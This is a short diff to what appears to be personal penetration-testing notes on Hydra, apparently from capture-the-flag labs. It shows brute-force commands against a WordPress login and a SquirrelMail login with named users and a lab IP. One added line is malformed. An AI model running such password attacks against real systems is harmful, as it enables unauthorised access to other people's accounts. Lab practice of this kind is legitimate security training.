@@ -34,7 +34,7 @@
 
 # Hydra
 - hydra -l username -P wordlist.txt server service
-- hydra -l username -P wordlist.txt service://server
+- hydra -l username -P wordlist.txt service://server (hydra -l -u $target smb -V -f)
 - -d = debug
 - -v = verbose
 - -V = show attempts
@@ -62,7 +62,6 @@
 
 ```
 hydra -l Elliot -P /usr/share/wordlists/rockyou.txt.gz $target http-post-form\n'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.134.131%2Fwp-admin%2F&testcookie=1:ERROR: The password you entered for the username elliot is incorrect. Lost your password?'  -f
-
 
 hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.'\n
 
